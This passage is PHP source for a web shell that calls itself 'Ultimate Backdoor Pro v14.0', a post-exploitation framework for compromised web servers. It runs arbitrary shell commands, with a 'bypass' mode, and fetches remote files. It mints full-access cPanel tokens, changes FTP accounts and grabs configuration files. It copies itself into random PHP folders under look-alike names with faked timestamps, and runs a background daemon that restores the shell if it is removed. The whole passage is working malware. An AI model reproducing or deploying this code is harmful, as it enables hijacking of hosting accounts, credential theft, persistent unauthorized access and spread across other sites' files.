    if ($content === false && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        ]);
        $content = curl_exec($ch);
        curl_close($ch);
        if ($content !== false) $method = 'curl';
    }
    
    if ($content !== false && @file_put_contents($target, $content) !== false) {
        $responseMessage = "✅ Remote file downloaded using $method: " . basename($target);
    } else {
        $responseMessage = '❌ Failed to download remote file. URL: ' . e($url);
        $cmdOutput = "Remote upload failed. Check URL or permissions.";
    }
}

// ============================================================
// NEW FOLDER
// ============================================================
if (isset($_POST['newfolder']) && !empty($_POST['foldername'])) {
    fixPermission($currentDirectory);
    if (@mkdir($currentDirectory . '/' . $_POST['foldername'], 0755)) $responseMessage = '📁 Folder created: ' . $_POST['foldername'];
    else $responseMessage = '❌ Failed to create folder.';
}

// ============================================================
// COMMAND
// ============================================================
if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $useBypass = isset($_POST['use_bypass']) && $_POST['use_bypass'] === '1';
    if ($useBypass) {
        $bypassOut = runBypass($_POST['cmd']);
        $cmdOutput = $bypassOut ?: 'Bypass returned no output.';
    } else {
        $cmdOutput = runCmd($_POST['cmd']);
    }
}

// ============================================================
// CPANEL TOKEN
// ============================================================
if (isset($_POST['cpanel_token'])) {
    $randomName = 'lp' . substr(md5(uniqid(mt_rand(), true)), 0, 8);
    $uapiOutput = runUapi('Tokens create_full_access name=' . $randomName);
    $serverDomain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'unknown';
    $serverDomain = preg_replace('/^https?:\/\//', '', $serverDomain);
    $serverDomain = rtrim($serverDomain, '/');
    $serverUser = trim(runCmd('whoami') ?? get_current_user());
    $token = '';
    if ($uapiOutput && preg_match('/token:\s*[\'"]?([A-Z0-9]+)[\'"]?/i', $uapiOutput, $m)) $token = $m[1];
    $cmdOutput = "=== cPanel Token ===\nLogin: https://$serverDomain:2083/\nDomain: $serverDomain\nUser: $serverUser\nToken: $token\n";
    if (!empty($token)) $responseMessage = '✅ cPanel token created';
    else { $cmdOutput .= "\nRaw output:\n" . ($uapiOutput ?: 'No output'); $responseMessage = '❌ Token creation failed'; }
}

// ============================================================
// FTP
// ============================================================
if (isset($_POST['ftp_list']) || isset($_POST['ftp_add']) || isset($_POST['ftp_passwd']) || isset($_POST['ftp_delete'])) {
    $ftpListRaw = runUapi('Ftp list_ftp');
    $ftpAccounts = parseUapiFtpList($ftpListRaw);
}

if (isset($_POST['ftp_list'])) $responseMessage = count($ftpAccounts) . ' FTP account(s) found.';

if (isset($_POST['ftp_add']) && !empty($_POST['ftp_user']) && !empty($_POST['ftp_pass'])) {
    $ftpUser = $_POST['ftp_user'];
    $ftpPass = $_POST['ftp_pass'];
    $ftpQuota = !empty($_POST['ftp_quota']) ? $_POST['ftp_quota'] : '0';
    $homeDir = getenv('HOME') ?: ('/home/' . get_current_user());
    $addOutput = runUapi('Ftp add_ftp user=' . escapeshellarg($ftpUser) . ' pass=' . escapeshellarg($ftpPass) . ' quota=' . escapeshellarg($ftpQuota) . ' homedir=' . escapeshellarg($homeDir));
    $parsed = parseUapiStatus($addOutput);
    if ($parsed['ok']) $responseMessage = '✅ FTP account "' . $ftpUser . '" created.';
    else { $errorMessage = '❌ FTP creation failed.'; $cmdOutput = $addOutput; }
}

if (isset($_POST['ftp_passwd']) && !empty($_POST['ftp_chg_user']) && !empty($_POST['ftp_chg_pass']) && !empty($_POST['ftp_chg_domain'])) {
    $chgUser = $_POST['ftp_chg_user'];
    $chgPass = $_POST['ftp_chg_pass'];
    $chgDomain = $_POST['ftp_chg_domain'];
    $passwdOutput = runUapi('Ftp passwd user=' . escapeshellarg($chgUser) . ' domain=' . escapeshellarg($chgDomain) . ' pass=' . escapeshellarg($chgPass));
    $parsed = parseUapiStatus($passwdOutput);
    if ($parsed['ok']) $responseMessage = '✅ Password changed for "' . $chgUser . '@' . $chgDomain . '".';
    else { $errorMessage = '❌ Password change failed.'; $cmdOutput = $passwdOutput; }
}

if (isset($_POST['ftp_delete']) && !empty($_POST['ftp_del_user']) && !empty($_POST['ftp_del_domain'])) {
    $delUser = $_POST['ftp_del_user'];
    $delDomain = $_POST['ftp_del_domain'];
    $delOutput = runUapi('Ftp delete_ftp user=' . escapeshellarg($delUser) . ' domain=' . escapeshellarg($delDomain));
    $parsed = parseUapiStatus($delOutput);
    if ($parsed['ok']) $responseMessage = '✅ FTP account "' . $delUser . '@' . $delDomain . '" deleted.';
    else { $errorMessage = '❌ FTP deletion failed.'; $cmdOutput = $delOutput; }
}

// ============================================================
// FILE ACTIONS
// ============================================================
if (isset($_GET['del'])) {
    $file = $_GET['del'];
    $fileDir = dirname($file);
    if (deleteFile($file)) { header('Location: ?lph=' . urlencode($fileDir) . '&msg=deleted'); exit; }
    else $errorMessage = 'Failed to delete: ' . basename($file);
}

if (isset($_GET['edit']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
    fixPermission($_GET['edit']);
    fixPermission(dirname($_GET['edit']));
    if (@file_put_contents($_GET['edit'], $_POST['content']) !== false) $responseMessage = '✅ File saved.';
    else $errorMessage = '❌ Error saving file.';
}

if (isset($_GET['rename']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name'])) {
    $responseMessage = renameFile($_GET['rename'], $_POST['new_name']);
}

if (isset($_GET['chmod']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['permission'])) {
    $perm = intval($_POST['permission'], 8);
    if ($perm > 0 && @chmod($_GET['chmod'], $perm)) $responseMessage = '✅ Permission changed.';
    else $errorMessage = '❌ Error changing permission.';
}

if (isset($_GET['msg']) && $_GET['msg'] === 'deleted') $responseMessage = '🗑️ Item deleted successfully.';

// ============================================================
// GRAB CONFIG
// ============================================================
if (isset($_POST['grab_config'])) {
    $result = grabConfigAll();
    $cmdOutput = $result['output'];
    $responseMessage = "✅ Configs grabbed to: " . $result['dir'];
}

// ============================================================
// MASS SPREAD + URL (from advanced)
// ============================================================
function massSpreadWithURL($file_sumber, $dir_target, $maksimal_folder = 10) {
    $output = '';
    $urls = [];
    $webroot = $_SERVER['DOCUMENT_ROOT'] ?? '';
    $base_url = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
    
    if (!file_exists($file_sumber)) {
        return ['output' => "File sumber tidak ditemukan: $file_sumber", 'urls' => []];
    }
    
    $output .= "[*] Memulai pengumpulan folder...\n";
    
    try {
        $directory = new RecursiveDirectoryIterator($dir_target, RecursiveDirectoryIterator::SKIP_DOTS);
        $iterator = new RecursiveIteratorIterator($directory, RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD);
        
        $kandidat_folder = [];
        foreach ($iterator as $item) {
            if ($item->isFile() && strtolower($item->getExtension()) === 'php') {
                $path_folder = $item->getPath();
                if (!isset($kandidat_folder[$path_folder])) {
                    $kandidat_folder[$path_folder] = [
                        'nama_file_asli' => pathinfo($item->getFilename(), PATHINFO_FILENAME),
                        'ekstensi_asli' => $item->getExtension(),
                        'real_path_file' => $item->getRealPath()
                    ];
                }
            }
        }
        
        $daftar_folder_keys = array_keys($kandidat_folder);
        shuffle($daftar_folder_keys);
        
        $output .= "[*] Total ditemukan " . count($daftar_folder_keys) . " folder berisi file PHP.\n";
        $output .= "[*] Memulai penebaran acak ke maksimal $maksimal_folder folder berbeda...\n";
        $output .= "--------------------------------------------------\n";
        
        $jumlah_tercopy = 0;
        $jumlah_dilewati = 0;
        
        foreach ($daftar_folder_keys as $path_folder) {
            if ($jumlah_tercopy >= $maksimal_folder) break;
            
            $info_file = $kandidat_folder[$path_folder];
            $nama_samaran = buatNamaSamaranSpread($info_file['nama_file_asli']);
            $nama_file_samaran = $nama_samaran . '.' . $info_file['ekstensi_asli'];
            $tujuan = $path_folder . DIRECTORY_SEPARATOR . $nama_file_samaran;
            
            if (file_exists($tujuan)) {
                $output .= "[~] Dilewati (sudah ada): $tujuan\n";
                $jumlah_dilewati++;
            } else {
                if (copy($file_sumber, $tujuan)) {
                    $waktu_original = filemtime($info_file['real_path_file']);
                    touch($tujuan, $waktu_original);
                    $output .= "[+] BERHASIL: $tujuan\n";
                    $url = str_replace($webroot, $base_url, $tujuan);
                    $url = str_replace('\\', '/', $url);
                    $urls[] = $url;
                    $jumlah_tercopy++;
                } else {
                    $output .= "[-] Gagal menyalin ke: $tujuan\n";
                }
            }
        }
        
        $output .= "--------------------------------------------------\n";
        $output .= "[✓] Selesai!\n";
        $output .= "    - Berhasil disebar: $jumlah_tercopy folder\n";
        $output .= "    - Dilewati: $jumlah_dilewati\n";
    } catch (Exception $e) {
        $output .= "[!] Error: " . $e->getMessage() . "\n";
    }
    
    return ['output' => $output, 'urls' => $urls];
}

function buatNamaSamaranSpread($nama_asli) {
    if (preg_match_all('/\d+/', $nama_asli, $matches)) {
        foreach ($matches[0] as $angka) {
            $panjang_angka = strlen($angka);
            $angka_baru = '';
            for ($i = 0; $i < $panjang_angka; $i++) {
                $angka_baru .= rand(0, 9);
            }
            $nama_asli = preg_replace('/' . $angka . '/', $angka_baru, $nama_asli, 1);
        }
        return $nama_asli;
    }
    $metode = rand(1, 3);
    $panjang = strlen($nama_asli);
    if ($metode == 1 && $panjang > 4) {
        $posisi_acak = rand(2, $panjang - 2);
        $huruf_target = $nama_asli[$posisi_acak];
        return substr_replace($nama_asli, $huruf_target, $posisi_acak, 0);
    } elseif ($metode == 2) {
        $suffixes = ['s', '_conf', '_api', '_core', '-v' . rand(2, 5), '_init', '.inc'];
        return $nama_asli . $suffixes[array_rand($suffixes)];
    } else {
        $huruf_acak = chr(rand(97, 122));
        return $nama_asli . '_' . $huruf_acak;
    }
}

if (isset($_POST['run_mass_spread_url'])) {
    $file_sumber = isset($_POST['spread_source']) && !empty($_POST['spread_source']) ? $_POST['spread_source'] : __FILE__;
    $dir_target = isset($_POST['spread_base_dir']) && !empty($_POST['spread_base_dir']) ? $_POST['spread_base_dir'] : $currentDirectory;
    $maksimal_folder = isset($_POST['spread_max']) ? (int)$_POST['spread_max'] : 10;
    $result = massSpreadWithURL($file_sumber, $dir_target, $maksimal_folder);
    $cmdOutput = $result['output'];
    if (!empty($result['urls'])) {
        $cmdOutput .= "\n\n=== URLs ===\n" . implode("\n", $result['urls']);
    }
    $responseMessage = "✅ Mass spread completed.";
}

// ============================================================
// SHELL LOCK FUNCTIONS (from Script A)
// ============================================================
function getLockDirs() {
    return [
        '/tmp/vai_locks/',
        '/var/tmp/vai_locks/',
        '/dev/shm/vai_locks/',
        '/run/shm/vai_locks/',
        sys_get_temp_dir() . '/vai_locks/',
    ];
}

function getLockDir($prefer = null) {
    $dirs = getLockDirs();
    if ($prefer && is_dir($prefer)) return rtrim($prefer, '/') . '/';
    if ($prefer && @mkdir($prefer, 0755, true)) return rtrim($prefer, '/') . '/';
    foreach ($dirs as $d) {
        if (is_dir($d) || @mkdir($d, 0755, true)) return $d;
    }
    $fallback = getcwd() . '/.vai_locks/';
    @mkdir($fallback, 0755, true);
    return $fallback;
}

function shellLockFile($file, $lockDir = null) {
    $lockDir = $lockDir ?: getLockDir();
    if (!file_exists($file) || !is_file($file)) return ['error' => 'File not found.'];
    $token = md5($file . uniqid(mt_rand(), true));
    $backupFile = $lockDir . 'backup_' . $token;
    $pidFile = $lockDir . 'pid_' . $token;
    $lockFile = $lockDir . $token . '.lock';
    $scriptFile = $lockDir . 'monitor_' . $token . '.php';
    if (!@copy($file, $backupFile)) return ['error' => 'Failed to create backup.'];
    @chmod($file, 0444);
    $scriptContent = '<?php
$file = "' . addslashes($file) . '";
$backup = "' . addslashes($backupFile) . '";
$lockDir = "' . addslashes($lockDir) . '";
$token = "' . addslashes($token) . '";
$pidFile = $lockDir . "pid_" . $token;
while(true){
    if(!file_exists($file)){
        if(file_exists($backup)){
            copy($backup, $file);
            chmod($file, 0444);
            @touch($file, filemtime($backup));
        }
    } else {
        $p = fileperms($file) & 0777;
        if($p !== 0444) chmod($file, 0444);
    }
    if(file_exists($pidFile)){
        $pid = trim(file_get_contents($pidFile));
        if($pid && function_exists("posix_kill") && !posix_kill($pid, 0)){
            $cmd = "php " . escapeshellarg(__FILE__) . " > /dev/null 2>&1 & echo $!";
            $newPid = trim(shell_exec($cmd));
            if(is_numeric($newPid)) file_put_contents($pidFile, $newPid);
        }
    }
    sleep(3);
}
?>';
    if (file_put_contents($scriptFile, $scriptContent) === false) {
        @unlink($backupFile);
        return ['error' => 'Failed to create monitor script.'];
    }
    $cmd = "php " . escapeshellarg($scriptFile) . " > /dev/null 2>&1 & echo $!";
    $pid = trim(shell_exec($cmd));
    if (!is_numeric($pid)) {
        @unlink($backupFile);
        @unlink($scriptFile);
        return ['error' => 'Failed to start monitor process.'];
    }
    file_put_contents($pidFile, $pid);
    $info = ['file' => $file, 'backup' => $backupFile, 'pid' => $pid, 'token' => $token, 'created' => time(), 'script' => $scriptFile, 'lockDir' => $lockDir, 'pidFile' => $pidFile];
    file_put_contents($lockFile, serialize($info));
    return ['success' => true, 'pid' => $pid, 'token' => $token, 'lockDir' => $lockDir, 'file' => $file];
}

function shellUnlockFile($token, $lockDir = null) {
    $lockDir = $lockDir ?: getLockDir();
    $lockFile = $lockDir . $token . '.lock';
    if (!file_exists($lockFile)) return ['error' => 'Lock not found.'];
    $data = file_get_contents($lockFile);
    $info = unserialize($data);
    if (!$info) return ['error' => 'Invalid lock data.'];
    $pid = $info['pid'] ?? null;
    if (is_numeric($pid)) @exec("kill -9 $pid 2>/dev/null");
    @unlink($info['script'] ?? '');
    @unlink($info['backup'] ?? '');
    @unlink($info['pidFile'] ?? '');
    @unlink($lockFile);
    if (isset($info['file']) && file_exists($info['file'])) { @chmod($info['file'], 0644); }
    return ['success' => true, 'file' => $info['file'] ?? 'unknown'];
}

function listShellLocks($lockDir = null) {
    $lockDir = $lockDir ?: getLockDir();
    $locks = [];
    $files = glob($lockDir . '*.lock');
    foreach ($files as $f) {
        $data = @file_get_contents($f);
        if ($data) {
            $info = unserialize($data);
            if ($info) $locks[] = $info;
        }
    }
    return $locks;
}

// ============================================================
// SHELL LOCK HANDLER (from Script A)
// ============================================================
if (isset($_POST['shell_lock_action'])) {
    $lockDir = isset($_POST['lock_dir']) ? $_POST['lock_dir'] : sys_get_temp_dir() . '/vai_locks/';
    if (isset($_POST['lock_file']) && !empty($_POST['lock_file'])) {
        $result = shellLockFile($_POST['lock_file'], $lockDir);
        if (isset($result['success'])) $responseMessage = "✅ File locked. PID: " . $result['pid'];
        else $errorMessage = "❌ " . $result['error'];
    }
}

if (isset($_GET['unlock']) && isset($_GET['token'])) {
    $result = shellUnlockFile($_GET['token']);
    if (isset($result['success'])) $responseMessage = "✅ Unlocked: " . $result['file'];
    else $errorMessage = "❌ " . $result['error'];
}

// ============================================================
// LOGOUT / SELF DESTRUCT
// ============================================================
if (isset($_GET['a']) && $_GET['a'] === 'logout') {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (isset($_POST['destroy']) && isset($_POST['confirm']) && $_POST['confirm'] === 'yes') {
    if (unlink(__FILE__)) {
        session_destroy();
        die('<h2>🔥 Deleted.</h2>');
    } else {
        $errorMessage = '❌ Failed to delete.';
    }
}

// ============================================================
// MENU NAV
// ============================================================
$action = isset($_GET['a']) ? $_GET['a'] : 'home';

$menus = [
    ['a' => 'home', 'icon' => '🏠', 'label' => 'Home'],
    ['a' => 'cmd', 'icon' => '⚡', 'label' => 'Cmd'],
    ['a' => 'files', 'icon' => '📁', 'label' => 'Files'],
    ['a' => 'wp', 'icon' => '🔄', 'label' => 'WP'],
    ['a' => 'process', 'icon' => '⚙️', 'label' => 'Process'],
    ['a' => 'gsocket', 'icon' => '🔗', 'label' => 'GSSocket'],
    ['a' => 'uapi', 'icon' => '🛡️', 'label' => 'UAPI'],
    ['a' => 'ftp', 'icon' => '📂', 'label' => 'FTP'],
    ['a' => 'info', 'icon' => '📊', 'label' => 'Info'],
    ['a' => 'root', 'icon' => '👑', 'label' => 'Root'],
    ['a' => 'wpadmin', 'icon' => '📌', 'label' => 'WP Admin'],
    ['a' => 'scanwp', 'icon' => '🔍', 'label' => 'Scan WP'],
    ['a' => 'symlink', 'icon' => '🔗', 'label' => 'Symlink'],
    ['a' => 'shelllock', 'icon' => '🔒', 'label' => 'Shell Lock'],
    ['a' => 'userjump', 'icon' => '🚀', 'label' => 'User Jump'],
    ['a' => 'scannewfiles', 'icon' => '🕒', 'label' => 'Scan Files'],
    ['a' => 'disabled', 'icon' => '🚫', 'label' => 'Disabled'],
    ['a' => 'network', 'icon' => '🌐', 'label' => 'Network'],
    ['a' => 'advanced', 'icon' => '🛠', 'label' => 'Advanced'],
    ['a' => 'htaccess', 'icon' => '🔐', 'label' => 'HTAccess'],
    ['a' => 'config', 'icon' => '🔍', 'label' => 'Grab Config'],
    ['a' => 'spread', 'icon' => '📤', 'label' => 'Spread'],
    ['a' => 'selfdestruct', 'icon' => '💀', 'label' => 'Self'],
];

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ultimate Backdoor Pro v14.0</title>
<style>
:root {
    --bg: #0a0a1a;
    --bg-card: rgba(17,17,40,0.85);
    --bg-input: rgba(13,13,30,0.8);
    --border: rgba(30,30,58,0.6);
    --text: #e0e0f0;
    --text-muted: #6a6a8a;
    --gold: #ffd700;
    --gold-dark: #cc9900;
    --accent: #00d4ff;
    --red: #f85149;
    --green: #3fb950;
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
    font-family: 'Roboto Mono', 'Cascadia Code', 'Consolas', monospace;
    font-size: 14px;
    background: var(--bg);
    background-image: radial-gradient(ellipse at 10% 20%, rgba(0,212,255,0.03) 0%, transparent 50%), radial-gradient(ellipse at 90% 80%, rgba(255,215,0,0.03) 0%, transparent 50%);
    color: var(--text);
    min-height: 100vh;
}
::-webkit-scrollbar { width: 6px; height: 6px; }
::-webkit-scrollbar-track { background: var(--bg); }
::-webkit-scrollbar-thumb { background: var(--gold); border-radius: 3px; }
.app-header {
    background: linear-gradient(135deg, rgba(13,13,30,0.95) 0%, rgba(26,10,46,0.95) 100%);
    border-bottom: 1px solid var(--border);
    padding: 12px 24px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    backdrop-filter: blur(10px);
    position: sticky;
    top: 0;
    z-index: 100;
}
.header-title {
    font-size: 18px;
    font-weight: 700;
    font-family: 'Orbitron', monospace;
    background: linear-gradient(90deg, var(--gold), var(--accent));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    letter-spacing: 1px;
}
.header-sub { font-size: 10px; color: var(--text-muted); letter-spacing: 3px; }
.sys-badge {
    background: var(--bg-input);
    border: 1px solid var(--border);
    padding: 4px 12px;
    border-radius: 20px;
    font-size: 10px;
    color: var(--text-muted);
}
.container { max-width: 1440px; margin: 0 auto; padding: 16px 24px; }
.nav {
    display: flex;
    flex-wrap: wrap;
    gap: 4px;
    margin: 12px 0 16px;
    background: var(--bg-card);
    padding: 8px 12px;
    border-radius: 12px;
    border: 1px solid var(--border);
}
.nav a {
    color: var(--text-muted);
    text-decoration: none;
    padding: 6px 14px;
    border-radius: 8px;
    border: 1px solid transparent;
    transition: all 0.3s ease;
    font-size: 12px;
}
.nav a:hover { color: var(--text); border-color: var(--border); }
.nav a.active { background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: #000; border-color: var(--gold); font-weight: 700; }
.content {
    background: var(--bg-card);
    padding: 20px 24px;
    border-radius: 16px;
    border: 1px solid var(--border);
    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    min-height: 400px;
}
.glass { background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; padding: 16px 20px; margin-bottom: 12px; }
pre, .cmd-output { background: rgba(0,0,0,0.6); padding: 12px 16px; border-radius: 10px; white-space: pre-wrap; word-break: break-all; font-size: 12px; border: 1px solid var(--border); color: #7bed9f; max-height: 400px; overflow-y: auto; }
input, select, textarea { background: var(--bg-input); border: 1px solid var(--border); color: var(--text); padding: 8px 14px; border-radius: 8px; font-family: inherit; font-size: 13px; outline: none; }
input:focus, select:focus, textarea:focus { border-color: var(--accent); }
button, .btn { background: var(--bg-input); border: 1px solid var(--border); color: var(--text); padding: 8px 18px; border-radius: 8px; cursor: pointer; transition: all 0.3s; font-family: inherit; font-size: 12px; }
button:hover, .btn:hover { border-color: var(--accent); transform: translateY(-1px); }
.btn-primary { background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: #000; border-color: var(--gold); font-weight: 700; }
.btn-primary:hover { box-shadow: 0 4px 30px rgba(255,215,0,0.3); }
.btn-danger { background: rgba(248,81,73,0.15); color: var(--red); border-color: rgba(248,81,73,0.3); }
.btn-danger:hover { background: var(--red); color: #fff; }
.btn-success { background: rgba(63,185,80,0.15); color: var(--green); border-color: rgba(63,185,80,0.3); }
.btn-success:hover { background: var(--green); color: #fff; }
table { border-collapse: collapse; width: 100%; }
td, th { border: 1px solid var(--border); padding: 8px 12px; text-align: left; }
th { background: rgba(255,215,0,0.05); color: var(--gold); font-weight: 600; }
.msg-success { background: rgba(63,185,80,0.1); border: 1px solid rgba(63,185,80,0.3); color: var(--green); padding: 12px 18px; border-radius: 10px; margin-bottom: 14px; }
.msg-error { background: rgba(248,81,73,0.1); border: 1px solid rgba(248,81,73,0.3); color: var(--red); padding: 12px 18px; border-radius: 10px; margin-bottom: 14px; }
.flex { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
.mt-2 { margin-top: 10px; }
.text-gray { color: var(--text-muted); }
.text-green { color: var(--green); }
.text-red { color: var(--red); }
.text-gold { color: var(--gold); }
</style>
</head>
<body>
<header class="app-header">
    <div>
        <div class="header-title">🐉 ULTIMATE BACKDOOR</div>
        <div class="header-sub">v14.0 · POST-EXPLOITATION FRAMEWORK</div>
    </div>
    <div>
        <span class="sys-badge"><?php echo php_uname('s') . ' ' . php_uname('r'); ?></span>
        <span class="sys-badge"><?php echo @get_current_user(); ?></span>
        <a href="?a=logout&x=worm2024" style="color:var(--red);text-decoration:none;font-size:12px;padding:4px 12px;border:1px solid rgba(248,81,73,0.3);border-radius:20px;">⛔ Logout</a>
    </div>
</header>
<div class="container">
    <?php if (!empty($responseMessage)): ?><div class="msg-success">✅ <?php echo $responseMessage; ?></div><?php endif; ?>
    <?php if (!empty($errorMessage)): ?><div class="msg-error">❌ <?php echo $errorMessage; ?></div><?php endif; ?>

    <div class="nav">
        <?php foreach ($menus as $menu): ?>
            <a href="?a=<?= $menu['a'] ?>&x=worm2024" class="<?= $action == $menu['a'] ? 'active' : '' ?>">
                <?= $menu['icon'] ?> <?= $menu['label'] ?>
            </a>
        <?php endforeach; ?>
    </div>

    <div class="content">
    <?php
    // ============================================================
    // HOME
    // ============================================================
    if ($action === 'home' || $action === '') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:20px;">🚀 SYSTEM READY</h2>';
        echo '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin:16px 0;">';
        echo '<div class="glass"><span class="text-gray">Server</span><br><strong>' . e($_SERVER['SERVER_SOFTWARE']??'N/A') . '</strong></div>';
        echo '<div class="glass"><span class="text-gray">User</span><br><strong>' . e(exec('whoami') ?: get_current_user()) . '</strong></div>';
        echo '<div class="glass"><span class="text-gray">CWD</span><br><strong>' . e(getcwd()) . '</strong></div>';
        echo '<div class="glass"><span class="text-gray">PHP</span><br><strong>' . phpversion() . '</strong></div>';
        echo '<div class="glass"><span class="text-gray">WordPress</span><br><strong>' . ($wpAvailable ? '✅ Found' : '❌ Not found') . '</strong></div>';
        echo '</div>';
        echo '<p class="text-gray">Select a tool from the navigation above.</p>';
    }

    // ============================================================
    // COMMAND
    // ============================================================
    elseif ($action === 'cmd') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">⚡ Command</h2>';
        echo '<form method="POST">';
        echo '<div style="display:flex;gap:8px;align-items:center;background:rgba(0,0,0,0.4);padding:10px 14px;border-radius:10px;border:1px solid var(--border);">';
        echo '<span style="color:var(--green);font-weight:600;">$</span>';
        echo '<input type="text" name="cmd" placeholder="Enter command..." style="flex:1;background:transparent;border:none;color:var(--text);outline:none;" autofocus>';
        echo '<button type="submit" class="btn btn-primary">Run</button>';
        echo '</div></form>';
        if (!empty($cmdOutput)) echo '<div class="cmd-output"><pre>' . e($cmdOutput) . '</pre></div>';
    }

    // ============================================================
    // FILES
    // ============================================================
    elseif ($action === 'files') {
        $base = isset($_GET['dir']) ? $_GET['dir'] : $currentDirectory;
        $base = realpath($base) ?: $currentDirectory;
        $base = str_replace('\\', '/', $base);
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">📁 File Manager</h2>';
        echo '<div class="breadcrumb">';
        $bPath = str_replace('\\', '/', $base);
        $parts = explode('/', $bPath);
        foreach ($parts as $id => $part) {
            if ($part == '' && $id == 0) { echo '<a href="?a=files&dir=/">/</a>'; }
            elseif (!empty($part)) {
                $link = implode('/', array_slice($parts, 0, $id + 1));
                echo '<a href="?a=files&dir=' . urlencode($link) . '">' . e($part) . '</a>/';
            }
        }
        echo '</div>';
        echo '<div class="toolbar">';
        echo '<form method="POST" style="display:contents;"><input type="hidden" name="newfolder" value="1"><input type="text" name="foldername" placeholder="New folder" size="14"><button type="submit">📁 Create</button></form>';
        echo '<form method="POST" enctype="multipart/form-data" style="display:contents;"><input type="file" name="file"><button type="submit" name="upload">📤 Upload</button></form>';
        echo '<button onclick="showModal(\'multiupload\')" class="btn">📤 Multi Upload</button>';
        echo '<button onclick="showModal(\'remote\')" class="btn">🌐 Remote Upload</button>';
        echo '</div>';
        $fileDetails = getFileDetails($base);
        if (is_array($fileDetails)) {
            echo '<table><thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Perm</th><th>Actions</th></tr></thead><tbody>';
            foreach ($fileDetails as $fd) {
                $fullPath = $base . '/' . $fd['name'];
                echo '<tr>';
                if ($fd['type'] === 'Folder') {
                    echo '<td>📁 <a href="?a=files&dir=' . urlencode($fullPath) . '" style="color:var(--gold);font-weight:600;">' . e($fd['name']) . '</a></td>';
                } else {
                    echo '<td>📄 <a href="?a=files&edit=' . urlencode($fullPath) . '" style="color:var(--text);">' . e($fd['name']) . '</a></td>';
                }
                echo '<td>' . $fd['type'] . '</td>';
                echo '<td>' . $fd['size'] . '</td>';
                echo '<td style="color:' . $fd['perm_color'] . ';font-weight:600;">' . $fd['permission'] . '</td>';
                echo '<td style="display:flex;gap:4px;flex-wrap:wrap;">';
                echo '<a href="?a=files&edit=' . urlencode($fullPath) . '" class="btn" style="font-size:10px;padding:2px 10px;">✏️ Edit</a> ';
                echo '<a href="?a=files&rename=' . urlencode($fullPath) . '" class="btn" style="font-size:10px;padding:2px 10px;">📝 Rename</a> ';
                echo '<a href="?a=files&chmod=' . urlencode($fullPath) . '" class="btn" style="font-size:10px;padding:2px 10px;">🔧 Chmod</a> ';
                echo '<a href="?del=' . urlencode($fullPath) . '" class="btn btn-danger" style="font-size:10px;padding:2px 10px;" onclick="return confirm(\'Delete?\')">🗑️</a>';
                echo '</td></tr>';
            }
            echo '</tbody></table>';
        } else echo '<p style="color:var(--text-muted);">No files or folders.</p>';
        if (isset($_GET['edit'])) {
            $file = $_GET['edit'];
            $content = @file_get_contents($file);
            echo '<h3 style="color:var(--gold);margin-top:16px;">✏️ Editing: ' . e(basename($file)) . '</h3>';
            echo '<form method="POST"><textarea name="content" style="width:100%;min-height:300px;background:rgba(0,0,0,0.6);border:1px solid var(--border);color:var(--green);padding:14px;font-family:monospace;font-size:13px;border-radius:10px;">' . e($content) . '</textarea>';
            echo '<div style="margin-top:10px;display:flex;gap:10px;"><button type="submit" class="btn btn-primary">💾 Save</button> <a href="?a=files&dir=' . urlencode(dirname($file)) . '" class="btn">Cancel</a></div></form>';
        }
        if (isset($_GET['rename'])) {
            $file = $_GET['rename'];
            echo '<h3 style="color:var(--gold);margin-top:16px;">📝 Rename: ' . e(basename($file)) . '</h3>';
            echo '<form method="POST"><input type="text" name="new_name" value="' . e(basename($file)) . '" style="width:300px;"><button type="submit" class="btn btn-primary">Rename</button></form>';
        }
        if (isset($_GET['chmod'])) {
            $file = $_GET['chmod'];
            echo '<h3 style="color:var(--gold);margin-top:16px;">🔧 Chmod: ' . e(basename($file)) . '</h3>';
            echo '<form method="POST"><input type="text" name="permission" placeholder="0755" maxlength="4" style="width:120px;"><button type="submit" class="btn btn-primary">Change</button></form>';
        }
    }

    // ============================================================
    // WORDPRESS MANAGER
    // ============================================================
    elseif ($action === 'wp') {
        echo '<h2 style="color:var(--gold);font-family:Orbitron;font-size:18px;">🔄 WordPress Manager</h2>';
        if (!$wpAvailable) { echo '<p style="color:var(--red);">❌ wp-load.php not found.</p>'; }
        else {
            echo '<div style="background:var(--bg-input);padding:16px;border-radius:12px;border:1px solid var(--border);margin-bottom:16px;">';
            echo '<h3 style="color:var(--gold);font-size:14px;">➕ Create Admin</h3>';
            echo '<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:8px;">';
            echo '<input type="text" id="wpNewUser" placeholder="Username" style="width:100%;">';
            echo '<input type="text" id="wpNewPass" placeholder="Password" style="width:100%;">';
            echo '<input type="text" id="wpNewEmail" placeholder="Email (optional)" style="width:100%;">';
